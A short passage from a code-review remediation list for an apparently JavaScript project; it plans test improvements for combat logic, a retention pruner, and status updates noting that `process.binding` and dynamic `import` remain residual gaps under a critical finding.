4. **NEW-1/NEW-2 combat fidelity** (`Math.hypot` + a real `pvp.attack` fake + plugin-presence assertion) — the least-proven live path.
5. **NEW-3 retention pruner** (or mark deferred); the rest of the MED/LOW/NIT cluster are small claim↔code reconciliations (S8).
6. Update the **CRIT-1/2 status prose** (banner + comments): CRIT-1 recursion is *closed*; CRIT-2 residual includes `process.binding`/dynamic `import`.
